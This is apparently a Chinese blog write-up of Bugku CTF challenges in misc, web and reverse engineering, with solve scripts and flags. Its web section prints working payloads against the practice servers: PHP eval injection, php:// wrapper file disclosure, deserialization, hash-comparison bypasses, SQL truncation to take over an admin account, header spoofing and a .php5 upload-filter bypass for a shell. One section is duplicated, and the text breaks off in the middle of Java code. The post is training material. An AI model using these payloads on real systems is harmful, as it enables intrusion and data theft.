---
title: Bugku-wp
date: 2019-10-24 20:54:25
tags:
- crypto
- pwn
- re
- web
- misc
- re
categories:
- CTF
- wp
mathjax: true
---

> bugku的部分wp

# MISC

## 闪的好快

![1568616335935](1568616335935.png)

下载文件是一个动态二维码，扫描第一帧之后会返回一个S，所以猜测就是所有二维码的字符串就是flag，所以写个脚本：

```python
#-*- coding: UTF-8 -*-  
 
import os
import requests
import sys
from io import BytesIO
from pyzbar import pyzbar
from PIL import Image,ImageEnhance
 
def analyseImage(path):
    '''
    Pre-process pass over the image to determine the mode (full or additive).
    Necessary as assessing single frames isn't reliable. Need to know the mode 
    before processing all frames.
    '''
    im = Image.open(path)
    results = {
        'size': im.size,
        'mode': 'full',
    }
    try:
        while True:
            if im.tile:
                tile = im.tile[0]
                update_region = tile[1]
                update_region_dimensions = update_region[2:]
                if update_region_dimensions != im.size:
                    results['mode'] = 'partial'
                    break
            im.seek(im.tell() + 1)
    except EOFError:
        pass
    return results
 
 
def processImage(path):
    '''
    Iterate the GIF, extracting each frame.
    '''
    mode = analyseImage(path)['mode']
    
    im = Image.open(path)
 
    i = 0
    p = im.getpalette()
    last_frame = im.convert('RGBA')
    
    try:
        while True:
            print "saving %s (%s) frame %d, %s %s" % (path, mode, i, im.size, im.tile)
          
            '''
            If the GIF uses local colour tables, each frame will have its own palette.
            If not, we need to apply the global palette to the new frame.
            '''
            if not im.getpalette():
                im.putpalette(p)
            
            new_frame = Image.new('RGBA', im.size)
            
            '''
            Is this file a "partial"-mode GIF where frames update a region of a different size to the entire image?
            If so, we need to construct the new frame by pasting it on top of the preceding frames.
            '''
            if mode == 'partial':
                new_frame.paste(last_frame)
            
            new_frame.paste(im, (0,0), im.convert('RGBA'))
            new_frame.save('%s-%d.png' % (''.join(os.path.basename(path).split('.')[:-1]), i), 'PNG')
 
            i += 1
            last_frame = new_frame
            im.seek(im.tell() + 1)
    except EOFError:
        pass
 
def get_ewm():
    """ 读取二维码的内容： img_adds：二维码地址（可以是网址也可是本地地址 """
    for i in range(0,18):
        img_adds = "masterGO-"+str(i)+".png"
        #print(img_adds)
        if os.path.isfile(img_adds):
        # 从本地加载二维码图片
            img = Image.open(img_adds)
        else:
            # 从网络下载并加载二维码图片
            rq_img = requests.get(img_adds).content
            img = Image.open(BytesIO(rq_img))
    
        # img.show()  # 显示图片，测试
        txt_list = pyzbar.decode(img)
    
        for txt in txt_list:
            barcodeData = txt.data.decode("utf-8")
            sys.stdout.write(barcodeData)
 
def main():
    #先将gif分解为单帧
    #processImage('masterGO.gif')
    get_ewm()
    print("\n")
    
 
if __name__ == "__main__":
    main()
```

 得到`flag:SYC{F1aSh_so_f4sT}`

## 啊哒

![1568827458685](1568827458685.png)

用binwalk查看文件

![1568828004482](1568828004482.png)

发现有个压缩包，binwalk分离文件，直接分离文件

![1568828961957](1568828961957.png)

得到myzip，进行解压，发现需要密码，这个时候查看一些图片的具体信息，发现

![1568829019838](1568829019838.png)

将这部分16进制转成字符串，得到`sdnisc_2018`

输入，得到flag.txt，

![1568829211025](1568829211025.png)

得到`flag{3XiF_iNf0rM@ti0n}`



## come_game

打开文件，发现：

![1569325053446](1569325053446.png)

打开游戏运行，界面如下

![1569325918803](1569325918803.png)

发现新生成了三个文件：

![1569325939931](1569325939931.png)

用winhex打开看看，最后发现是save1文件中，存储着关卡信息，更改2对应16进制，将32改为33

![1569325998150](1569325998150.png)

发现关卡发生改变，接着改到35时，出现flag:

![1569326120568](1569326120568.png)

所以flag为`FLAG{6E23F259D98DF153}`



## 白哥的鸽子

下载下来一个jpg二进制文件，猜测可能是图片，改一下文件名，

![1](1.jpg)

放到linux下，binwalk查看一下隐藏文件，发现没有什么特殊的地方，用winhex打开，

![1569488195253](1569488195253.png)

在末尾发现一段可用字符串，可能被加密了，用各种基本解密方法尝试解密，发现是栅栏密码，

![1569488342884](1569488342884.png)

发现`flag{w22_is_v3ry_cool}`



## linux

下载下来一个压缩包文件，然后在linux中进行解压，得到一个flag的二进制文件，使用cat进行捕捉，发现flag:

![1569487517188](1569487517188.png)



## 隐写3

下载一个压缩包，打开发现里面有张图片



放到linux中尝试看![1569487731556](1569487731556.png)看是否有隐藏文件，发现不能打开，所以猜测是CRC校验的问题，修改高度对应位置：

![1569487950545](1569487950545.png)

![1569488713708](1569488713708.png)

得到`flag{He1l0_d4_ba1}`



## 做个游戏(08067CTF)

打开文件，一个java程序，运行：

![1570107328501](1570107328501.png)

题目描述说，60秒，后面的速度越来越快，不太行~

尝试使用逆向工具，

![1570111100476](1570111100476.png)

代码文件里面翻阅，发现

![1570111442136](1570111442136.png)

得到`flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}`

交上去发现不对，看其中被base64加密了，解密后`flag{DajiDali_JinwanChiji}`



# Web

## Web2

打开链接：

![1563499089600](1563499089600.png)

查看源码，查找flag

`KEY{Web-2-bugKssNNikls9100}`



## 计算器

打开链接，发现只能输入一位

![1563499243714](1563499243714.png)

按f12打开控制台，查看相关源代码，发现maxlen=1，将其改为2，

![1563499346428](1563499346428)

重新输入，结果21即可得到`flag{CTF-bugku-0032}`



## web基础$_GET

打开链接,发现以下代码：

```php
$what=$_GET['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';
```

很简单就是用GET方法进行传值，注意**在index.php界面**进行传值，payload如下：

`http://123.206.87.240:8002/get/index.php?what=flag`

得到`flag{bugku_get_su8kej2en}`



## web基础$_POST

跟上题很像，只是传参方法换了，使用POST方法，使用hackbar，直接传参：

![1563499955737](1563499955737.png)

得到`flag{bugku_get_ssseint67se}`



## 矛盾

打开链接，得到这个:

```php
$num=$_GET['num'];
if(!is_numeric($num))  //num不能是个数字
{
echo $num;
if($num==1)  //num需要等于1
echo 'flag{**********}';
}
```

`==`是比较运算符号  不会检查条件式的表达式的类型，所以我们可以构造一组整数等于1的字符串payload如下：
`http://123.206.87.240:8002/get/index1.php?num=1s`

得到`flag{bugku-789-ps-ssdf}`



## web3

打开链接：

![1563500308549](1563500308549.png)



查看源码。发现一组编码：

`&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;`

unicode编码，解码得到`KEY{J2sa42ahJK-HS11III}`



## 域名解析

![1563500701982](1563500701982.png)

直接添加hosts文件，在尾部加上`123.206.87.240  flag.baidu.com `

在浏览器中输入：`flag.baidu.com`得到`KEY{DSAHDSJ82HDS2211}`



## 你必须让他停下

打开链接，发现：

![1563501010048](1563501010048.png)



看源码，会发现图片一直在变，在这个页面一直刷新就行，就能得到flag

![1563502005100](1563502005100.png)



## 本地包含

```php
<?php 
    include "flag.php"; 
    $a = @$_REQUEST['hello']; 
    eval( "var_dump($a);"); 
    show_source(__FILE__); 
?>
```

### 方法一：eval存在命令执行漏洞，使用hello构造payload

`http://123.206.87.240:8003/index.php?hello=1);show_source(%27flag.php%27);var_dump(3`

```php
int(1) <?php 
    $flag = 'Too Young Too Simple'; 
    # echo $flag; 
    # flag{bug-ctf-gg-99}; 
?> int(3) <?php 
    include "flag.php"; 
    $a = @$_REQUEST['hello']; 
    eval( "var_dump($a);"); 
    show_source(__FILE__); 
?>
```

### 方法二：

`http://123.206.87.240:8003/index.php?hello=1);include $_POST['f'];`

在POST区域：`f=php://filter/convert.base64-encode/resource=flag.php`

![img](20180904195840563.png)

### 方法三：直接将flag.php文件读入变量hello中

`?hello=get_file_contents('flag.php')`

![1563502905376](1563502905376.png)



## 备份是个好习惯

利用md5或者php中`“==”`的漏洞进行操作

```php
<?php
include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);  //用空串覆盖key所以需要构造两个重复
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

关键代码就是需要key1与key2的值相等，但是加密之前的值不同

- md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的

  ```php
  http://123.206.87.240:8002/web16?kkeyey1[]=something&kkeyey2[]=nothing
  ```

- 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。

  ```php
  下列的字符串的MD5值都是0e开头的：
  
  QNKCDZO
  
  240610708
  
  s878926199a
  
  s155964671a
  
  s214587387a
  
  s214587387a
  http://123.206.87.240:8002/web16?kkeyey1=QNKCDZO&kkeyey2=240610708
  ```

## 秋名山老司机

2s秒内需要计算出结果然后post value值上去，可以用脚本进行计算

![1563074255375](1563074255375.png)

```python
import requests
import re
url='http://123.206.87.240:8002/qiumingshan/'
r=requests.session()
requestpage = r.get(url)
ans = re.findall('<div>(.*?)=\?;</div>', requestpage.text)  #获取表达式
#print("ans",ans)
ans="".join(ans)#列表转为字符串
post=eval(ans)#计算表达式的值
data={'value':post}#构造post的data部分
flag=r.post(url,data=data)
print(flag.text)
```

得到`flag: Bugku{YOU_DID_IT_BY_SECOND}`



## 速度要快

![1563074538607](1563074538607.png)

看看源代码，需要我们post一个margin值上去

![1563074553394](1563074553394.png)

尝试抓包，发送repeater一下，然后go，发现flag，base64解密

![1563074657978](1563074657978.png)

交上去，发现不对，然后将margin赋值，用post方法传上去，发现也不对，再go几次发现，flag值在变化..…..…

想想题目说速度要快，所以可能需要通过脚本进行传值

```python
import requests
import base64
url="http://123.206.87.240:8002/web6/"
r=requests.session()
headers=r.get(url).headers #获取header
mid=base64.b64decode(headers['flag'])
mid=mid.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的
flag = base64.b64decode(mid.split(':')[1])#获得flag:后的值
data={'margin':flag}
print (r.post(url,data).text)#post方法传上去
```



## cookie欺骗

![1563084583171](1563084583171.png)

打开看是一堆字符串，而且是一组重复出现，尝试MD5解密，没有结果。之后看看url

`http://123.206.87.240:8002/web11/index.php?line=&filename=a2V5cy50eHQ=`

filename后的好像是base64编码，尝试解码：keys.txt

也就是说我们可以通过filename来得到文件信息,而我们想得到flag可以尝试看一下后台index.php的源码，同样需要将iindex.php编码,用line控制行数可将其打印出。

`http://123.206.87.240:8002/web11/index.php?line=1&filename=aW5kZXgucGhw`

使用脚本

```python
import requests
for i in range(30):
    url = "http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&filename=aW5kZXgucGhw"
    s = requests.get(url)
    print(s.text)
```

得到

```php
<?php

error_reporting(0);

$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");

$line=isset($_GET['line'])?intval($_GET['line']):0;

if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");

$file_list = array(

'0' =>'keys.txt',

'1' =>'index.php',

);
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){

$file_list[2]='keys.php';

}
if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}
?>
```

我们可以尝试添加Cookie,然后将keys.php编码后传上去

![1563085751184](1563085751184.png)

得到`flag:KEY{key_keys}`



## nerve give up

![1563086276292](1563086276292.png)

还是看看源码：

![1563086305533](1563086305533.png)

所以访问下`http://123.206.87.240:8006/test/1p.html`

```php
<HTML>
<HEAD>
<SCRIPT LANGUAGE="Javascript">
<!--


var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" 
function OutWord()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
} 
OutWord();
// -->
</SCRIPT>
</HEAD>
<BODY>
</BODY>
</HTML>
```

得到一组base64加密字符串，注意这里%3D%3D-–%3E是url加密，解密的是`==-->`

所以直接进行base64解密得到：

```php
";if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.')) #寻找.在a中第一次出现的位置
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("f4l2a3g.txt");
}
else
{
	print "never never never give up !!!";
}
?>
```

尝试直接访问`f4l2a3g.txt`文件，得到`flag:flag{tHis_iS_THe_fLaG}`



## welcome to bugkuctf

打开链接，还是啥都没有，看看源代码

```php
<!--  
$user = $_GET["txt"];  
$file = $_GET["file"];  
$pass = $_GET["password"];  
  
if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
    //user不为空且user=welcome to the bugkuctf
    echo "hello admin!<br>";  
    include($file); //hint.php  
}else{  
    echo "you are not admin ! ";  
}  
 -->  
```

这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到    “php://input”协议。大致的意思是让　　txt=php://input ，之后在post过去一个字符串

`http://123.206.87.240:8006/index.php?txt=php://input`

`welcome to the bugkuctf`  //将其post上去

![1563087740125](1563087740125.png)

此时根据提示我们可以把包含的文件读出来了，这里要用到php的第二个伪协议：php://filter

`txt=php://input&file=php://filter/read=convert.base64-encode/resource=hint.php`（简单来说就是利用伪协议读取所包含文件的base64值）

```php
PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA== 

解码：
<?php  
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  //如果文件为空， 
            echo file_get_contents($this->file); 
			echo "<br>";
		return ("good");
        }  
    }  
}  
?>  
```

看看能不能直接读flag:

![1563088574560](1563088574560.png)

显然没有flag,所以不能直接访问。这个信息返回到index.php页面，所以讲hint.php改成index.php看看里面的信息。

```php
<?php  
$txt = $_GET["txt"];  
$file = $_GET["file"];  
$password = $_GET["password"];  
  
if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
    echo "hello friend!<br>";  
    if(preg_match("/flag/",$file)){ 
		echo "不能现在就给你flag哦";
        exit();  
    }else{  
        include($file);   
        $password = unserialize($password);  
        echo $password;  
    }  
}else{  
    echo "you are not the number of bugku ! ";  
}  
  
?>  
  
<!--  
$user = $_GET["txt"];  
$file = $_GET["file"];  
$pass = $_GET["password"];  
  
if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
    echo "hello admin!<br>";  
    include($file); //hint.php  
}else{  
    echo "you are not admin ! ";  
}  
 -->  
```

我们发现当Flag方法当做字符串执行时，会自动执行 __tostring 方法，方法中写了如果file文件存在，那么就输出file文件中的内容。构造一个Flag类型的参数，并把这个参数传给password然后get进去。并且这个file的值要是hint.php（因为要利用hint.php中的函数）

```php
<?php  
        class Flag{
        public $file;    
        }    
      
        $a = new Flag();  
        $a->file = "flag.php";  
        $a = serialize($a);  
        print_r($a);  
    ?>  
```

`O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`

所以构造的url为：`http://123.206.87.240:8006/index.php?txt=php://input&file=hint.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`

得到`flag:flag{php_is_the_best_language}`



## 字符？正则？

![1563096419448](1563096419448.png)

利用正则匹配构造id的值，用GET方法传上去

```python
/代表匹配的开始与结束两个/里面的内容就是要匹配的内容

.代表数字匹配任意数字，*代表匹配0-n次两者结合.*就是匹配任一个数字任意次

\表示要找\后面的内容，\/.\/就是找/数字/

{4,7}表示匹配前一个字符4到7次

[a-z]就是匹配a-z之间的字符

[[:punct:]]代表任意标点

i代表字体大小
```



## 前女友（SKCTF)

![1563152873367](1563152873367.png)

打开链接出现这个，查看源码，

![1563152912959](1563152912959.png)

点击一下，可以得到code.txt中的内容

```php
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){  //相等返回0，不相等返回非0值
            echo $flag;
        }
    }
}
?>
```

跟前面一道题很像，绕过md5，这里需要说一下就是strcmp在比较数组的时候返回应该是0，所以url构造如下：`http://123.206.31.85:49162/index.php?v1=QNKCDZO&v2=240610708&v3[]=something`

得到`flag:SKCTF{Php_1s_tH3_B3St_L4NgUag3}`



## login1(SKCTF)

![1563170285152](1563170285152.png)

随便注册一下，发现，无法登陆，发现可以注册账号，之后登陆发现需要获取管理员权限

1. 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的

   `SELECT * FROM users WHERE username='vampire     ';`

2. 在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。

注意密码是大小字母还要加数字，还有admin后的空格需要足够多的。

我的注册是：

```txt
admin                                                123
QW123q
```

之后登陆就能得到`flag:SKCTF{4Dm1n_HaV3_GreAt_p0w3R}`



## 你从哪里来

![1563172400331](1563172400331.png)

伪造一下来源，改一下referer

`referer: https://www.google.com`

得到`flag{bug-ku_ai_admin}`

目前遇到几个有关请求头的题，这里就稍微做一下总结

### **通用首部字段**

![20180520002110491](20180520002110491.png)

### **请求首部字段**

![20180520002238786](20180520002238786.png)

### **响应首部字段**

![20180520002319248](20180520002319248.png)



## md5 collision(NUPT_CTF)

![1563347322036](1563347322036.png)

根据题目所说，md5冲突，无非就是两个不同的值，但md5相等,所以先试试0e开头的

`http://123.206.87.240:9009/md5.php?a=s878926199a`

得到`flag:flag{md5_collision_is_easy}`



## 程序员本地网站

![1563347878023](1563347878023.png)

从本地访问，可以很清楚地看出，需要我们改一下X-Forwarded-For的值为：127.0.0.1

可以用burpsuite抓包，得到`flag:flag{loc-al-h-o-st1}`



## 各种绕过

![1563348024498](1563348024498.png)

打开链接会发现：

```php
 <?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);  //url解码
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd'])

        print 'passwd can not be uname.';

    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))

        die('Flag: '.$flag);
    else
        print 'sorry!';
}
?> 
```

首先id=urlencode(margin)=margin，uname不能和passwd相等，但是sha1之后要相等，sha1只对字符型进行处理，是数组的话返回false,注意是在index.php中传值。

所以`payload:http://123.206.87.240:8002/web7/index.php?id=margin&uname[]=something`

还需要`post：passwd[]=nothing`

可以用hackbar完成操作，得到`Flag: flag{HACK_45hhs_213sDD}`



## web8

![1563348852297](1563348852297.png)

```php
<?php
extract($_GET);
if (!empty($ac))
{
$f = trim(file_get_contents($fn));
//trim() 函数移除字符串两侧的空白字符或其他预定义字符
//file_get_contents() 函数把整个文件读入一个字符串中
if ($ac === $f)
{
echo "<p>This is flag:" ." $flag</p>";
}
else
{
echo "<p>sorry!</p>";
}
}
?>
```

题目中提出有txt文件，尝试1.txt,index.txt,flag.txt，最后发现flag.txt中有文件，

![1563348934053](1563348934053.png)

所以`payload:http://123.206.87.240:8002/web8/index.php?ac=flags&fn=flag.txt`

得到`flag:flag{3cfb7a90fc0de31}`



## 细心

![1563349135195](1563349135195.png)

打开链接发现这样的页面：

![1563349160681](1563349160681.png)

我还以为这道题又被大佬们给干掉了，看了别人的博客发现可以做，那就接着走..…..…

查看源码，什么也没有。怎么办？？用御剑扫一下后台吧

![1563349378055](1563349378055.png)

发现可以访问，robots.txt，打开看看

![1563349400409](1563349400409.png)

接着做

![1563349521709](1563349521709.png)

题目是想办法变成admin，所以试试下面这个`payload=http://123.206.87.240:8002/web13/resusl.php?x=admin`

得到`flag:flag(ctf_0098_lkji-s)`



## 求getshell

![1563349709402](1563349709402.png)

打开链接，![1563349760286](1563349760286.png)

大佬说的，如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，这里将文件的后缀名改为.jpg和.png都不可行，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag

先传一张图片，进行抓包，然后修改下面两个地方：

- filename 改为 1.php5
- 消息头中的Content-type将其后随便一个字母改为大写

![1563351052361](1563351052361.png)



# Re

## 入门逆向

下载下来，查看一下文件类型：

![1568826318865](1568826318865.png)

32位应用程序，所以用ida打开：

![1568826397313](1568826397313.png)

发现一组ASCII码的数据，直接进行解码就行

`flag{Re_1s_S0_C0oL}`

## Easy_vb

下载解题文件，查看一下文件类型：

![1568826639239](1568826639239.png)

用ida打开看看：

![1568827107099](1568827107099.png)

发现flag，看题目要求，flag最终为：`flag{_N3t_Rev_1s_E4ay_}`

## Easy_re

下载解题文件后，先查看文件类型

![1568913833317](1568913833317.png)

运行试试：

![1568913899702](1568913899702.png)

现在用ida打开看看，容易找到相应位置

![1568914507502](1568914507502.png)

逆序，`DUTCTF{We1c0met0DUTCTF}`Easy_re

下载解题文件后，先查看文件类型

![1568913833317](1568913833317.png)

运行试试：

![1568913899702](1568913899702.png)

现在用ida打开看看，容易找到相应位置

![1568914507502](1568914507502.png)

逆序，`DUTCTF{We1c0met0DUTCTF}`

## 游戏过关

### 方法一

这是一道exe逆向问题，而网上大多教程都是用OD解题，此时我对OD的使用情况并不是特别的熟练，尝试用ida进行解题。

用ida打开，

![1569121302586](1569121302586.png)

尝试找到main函数，可以i搜索，在function中用CTRL+F进行搜索：

![1569121358446](1569121358446.png)

查看main函数：

![1569121577728](1569121577728.png)

读完函数逻辑，查看其中的if-else判断，经逐个测试，发现最终会进入到：![1569121723181](1569121723181.png)

顺着思路，发现`sub_45E940`函数，打开查看逻辑：

```c++
sub_45A7BE("done!!! the flag is ");
  v59 = 18;
  v60 = 64;
  v61 = 98;
  v62 = 5;
  v63 = 2;
  v64 = 4;
  v65 = 6;
  v66 = 3;
  v67 = 6;
  v68 = 48;
  v69 = 49;
  v70 = 65;
  v71 = 32;
  v72 = 12;
  v73 = 48;
  v74 = 65;
  v75 = 31;
  v76 = 78;
  v77 = 62;
  v78 = 32;
  v79 = 49;
  v80 = 32;
  v81 = 1;
  v82 = 57;
  v83 = 96;
  v84 = 3;
  v85 = 21;
  v86 = 9;
  v87 = 4;
  v88 = 62;
  v89 = 3;
  v90 = 5;
  v91 = 4;
  v92 = 1;
  v93 = 2;
  v94 = 3;
  v95 = 44;
  v96 = 65;
  v97 = 78;
  v98 = 32;
  v99 = 16;
  v100 = 97;
  v101 = 54;
  v102 = 16;
  v103 = 44;
  v104 = 52;
  v105 = 32;
  v106 = 64;
  v107 = 89;
  v108 = 45;
  v109 = 32;
  v110 = 65;
  v111 = 15;
  v112 = 34;
  v113 = 18;
  v114 = 16;
  v115 = 0;
  v2 = 123;
  v3 = 32;
  v4 = 18;
  v5 = 98;
  v6 = 119;
  v7 = 108;
  v8 = 65;
  v9 = 41;
  v10 = 124;
  v11 = 80;
  v12 = 125;
  v13 = 38;
  v14 = 124;
  v15 = 111;
  v16 = 74;
  v17 = 49;
  v18 = 83;
  v19 = 108;
  v20 = 94;
  v21 = 108;
  v22 = 84;
  v23 = 6;
  v24 = 96;
  v25 = 83;
  v26 = 44;
  v27 = 121;
  v28 = 104;
  v29 = 110;
  v30 = 32;
  v31 = 95;
  v32 = 117;
  v33 = 101;
  v34 = 99;
  v35 = 123;
  v36 = 127;
  v37 = 119;
  v38 = 96;
  v39 = 48;
  v40 = 107;
  v41 = 71;
  v42 = 92;
  v43 = 29;
  v44 = 81;
  v45 = 107;
  v46 = 90;
  v47 = 85;
  v48 = 64;
  v49 = 12;
  v50 = 43;
  v51 = 76;
  v52 = 86;
  v53 = 13;
  v54 = 114;
  v55 = 1;
  v56 = 117;
  v57 = 126;
  v58 = 0;
  for ( i = 0; i < 56; ++i )
  {
    *(&v2 + i) ^= *(&v59 + i);
    *(&v2 + i) ^= 0x13u;
  }
  return sub_45A7BE("%s\n");
```

写个python脚本：

```python
#encoing=utf-8

array1 = [0x12,0x40,0x62,0x5,0x2,0x4,0x6,0x3,0x6,0x30,0x31,0x41,0x20,0x0C,0x30,0x41,0x1F,0x4E,0x3E,0x20,0x31,0x20,0x1,0x39,0x60,0x3,0x15,0x9,0x4,0x3E,0x3,0x5,0x4,0x1,0x2,0x3,0x2C,0x41,0x4E,0x20,0x10,0x61,0x36,0x10,0x2C,0x34,0x20,0x40,0x59,0x2D,0x20,0x41,0x0F,0x22,0x12,0x10,0x0]
 
array2 = [0x7B,0x20,0x12,0x62,0x77,0x6C,0x41,0x29,0x7C,0x50,0x7D,0x26,0x7C,0x6F,0x4A,0x31,0x53,0x6C,0x5E,0x6C,0x54,0x6,0x60,0x53,0x2C,0x79,0x68,0x6E,0x20,0x5F,0x75,0x65,0x63,0x7B,0x7F,0x77,0x60,0x30,0x6B,0x47,0x5C,0x1D,0x51,0x6B,0x5A,0x55,0x40,0x0C,0x2B,0x4C,0x56,0x0D,0x72,0x1,0x75,0x7E,0x0]
 
flag = ""
for i in range(0,0x38):
    flag += chr(array1[i]^array2[i]^0x13)
print(flag)
```

得到`zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}`

### 方法二

查看文件，

![1568914737217](1568914737217.png)

运行看看，

![1568914795086](1568914795086.png)

用OD打开，查找关键字符串,找到相应位置：

![1571315854653](1571315854653.png)

所以我们需要跳转到这来即可，现在我们重新查找关键字符串，找到输入的地方，下一个断点：
![1571315967180](1571315967180.png)

开始动态调试：
![1571316018557](1571316018557.png)

找到一个可以跳转的函数，将此处改为我们刚刚查找的地址：

`jle long 0141E968`

取消断点，运行一下：
![1571316136155](1571316136155.png)

得到`flag:zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}`

## Timer

一个apk文件，安装之后出现一个读秒的，用apktool进行反编译，查看									MainActivity函数。

```java
package net.bluelotus.tomorrow.easyandroid;

import android.os.Bundle;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {
    int beg = (((int) (System.currentTimeMillis() / 1000)) + 200000);
    int k = 0;
    int now;
    long t = 0;

    public native String stringFromJNI2(int i);

    public static boolean is2(int n) {
        if (n <= 3) {
            if (n > 1) {
                return true;
            }
            return false;
        } else if (n % 2 == 0 || n % 3 == 0) {
            return false;
        } else {
            int i = 5;
            while (i * i <= n) {
                if (n % i == 0 || n % (i + 2) == 0) {
                    return false;
                }
                i += 6;
            }
            return true;
        }
    }
    protected void onCreate(Bundle savedInstanceState) {
        //调用父类Activity的onCreate()方法,超类继承防止递归调用
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_main)这行代码，来将指定的资源xml文件加载到对应的activity
        setContentView((int) R.layout.activity_main);
        //文本框
        final TextView tv1 = (TextView) findViewById(R.id.textView2);
